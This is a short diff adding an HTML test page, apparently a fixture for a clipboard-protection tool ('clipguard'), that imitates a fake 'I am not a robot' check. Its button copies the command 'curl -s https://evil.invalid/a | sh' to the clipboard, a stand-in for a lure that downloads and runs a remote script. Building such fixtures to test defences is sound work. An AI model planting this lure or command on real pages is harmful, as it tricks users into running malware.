@@ -1,0 +1,7 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8"><title>Hidden textarea + execCommand</title>
+<script src="common.js"></script></head>
+<body><h1>Hidden textarea + execCommand</h1>
+<button id="go">I am not a robot</button>
+<script>document.getElementById("go").addEventListener("click",()=>window.__clipguard.execCopy(`curl -s https://evil.invalid/a | sh`));</script>
+</body></html>
